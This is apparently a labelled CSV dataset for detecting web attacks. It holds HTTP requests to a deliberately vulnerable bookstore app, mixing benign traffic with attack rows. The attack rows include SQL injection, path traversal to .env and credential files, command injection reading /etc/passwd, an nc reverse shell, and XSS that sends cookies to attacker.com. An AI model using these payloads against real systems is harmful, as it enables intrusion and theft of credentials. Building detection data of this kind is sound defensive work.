method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 46, ""rating"": 2, ""review_text"": ""Tác giả phân tích rất sâu sắc và gắn liền với thực tế doanh nghiệp.""}",172.16.1.56,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/orders/10/invoice.pdf,template=../../bookstore/settings/base.py,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.152,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/static/C:\windows\system32\calc.exe,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",3,PATH
GET,/api/v1/vulnerable/books/search/,q=Hoang+Tu+Be&category=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.224,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(`whoami`)""}",10.0.0.99,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""')/**/OR/**/('1'='1"", ""password"": """"}",172.16.4.12,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""'/**/AND/**/1=1--"", ""password"": ""123456""}",192.168.1.200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/api/v1/vulnerable/reviews/,book_id=36,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.1.81,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' UNION ALL SELECT null, email, password, null FROM auth_user--"", ""password"": ""password""}",192.168.1.150,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
GET,/api/v1/books/38/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.60,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
POST,/rate/21/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 1, ""comment"": ""Highly recommended for software engineers and architects!""}",10.0.0.198,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=Design+Patterns&page=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.206,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/search/,q=Cloud+Architecture&page=5,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,"q=1%09UNION%09SELECT%091,%09sqlite_version(),%093,%094--","{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.200,python-requests/2.31.0,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1& $(dir)""}",192.168.1.105,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 22, ""rating"": 4, ""review_text"": ""Dịch vụ đóng gói và chăm sóc khách hàng của Bookie Bookstore rất tốt.""}",172.16.1.32,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E""}",172.16.5.55,curl/8.4.0,2,XSS
GET,/categories/3/,page=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.45,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1| $(id)""}",203.0.113.45,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""1.1.1.1""}",10.0.0.59,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/books/,page=6&category_id=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.56,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
GET,/about/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.212,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
POST,/rate/19/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<scrIpt>document.location='http://attacker.com/steal?c='+document.cookie</scrIpt>""}",192.168.1.150,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""Hoang Minh"", ""email"": ""hoangminh54@gmail.com"", ""subject"": ""Hỗ trợ đơn hàng"", ""message"": ""Dịch vụ của Bookie rất tốt, hy vọng sớm mở rộng thêm kho tại Đà Nẵng.""}",10.0.0.124,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
POST,/rate/49/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 3, ""comment"": ""Nên đọc ít nhất một lần để có góc nhìn đa chiều về tư duy phản biện.""}",172.16.2.113,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/ebooks/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.32,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<script>document.location='http://attacker.com/steal?c='+document.cookie</script>""}",198.51.100.23,curl/8.4.0,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1|| cat /etc/passwd""}",198.51.100.77,sqlmap/1.7.11#stable (https://sqlmap.org),4,CMD
GET,/api/v1/vulnerable/books/search/,q=Tuoi+Tre+Dang+Gia+Bao+Nhieu,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.81,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.50,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/ebooks/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.238,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/books/26/read/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.116,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/v1/vulnerable/files/download/,file=..\..\..\..\sqlite3.db,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.210,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",3,PATH
GET,/orders/8/invoice.pdf,template=..\..\..\..\windows\win.ini,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,Go-http-client/1.1,3,PATH
GET,/api/v1/vulnerable/books/search/,q=DevOps,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 32, ""rating"": 5, ""review_text"": ""Sách hay! <audio/src=1/onerror=alert(1)>""}",192.168.1.150,Go-http-client/1.1,2,XSS
GET,/categories/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.77,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/static/../../../.env,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,203.0.113.45,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(nc -e /bin/sh 10.0.0.1 4444)""}",192.168.1.200,python-requests/2.31.0,4,CMD
GET,/ebooks/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.250,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/books/,category=4&sort=newest&page=6,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.99,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.215,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/api/search/,q=Docker&page=4&category=6,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.1.47,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
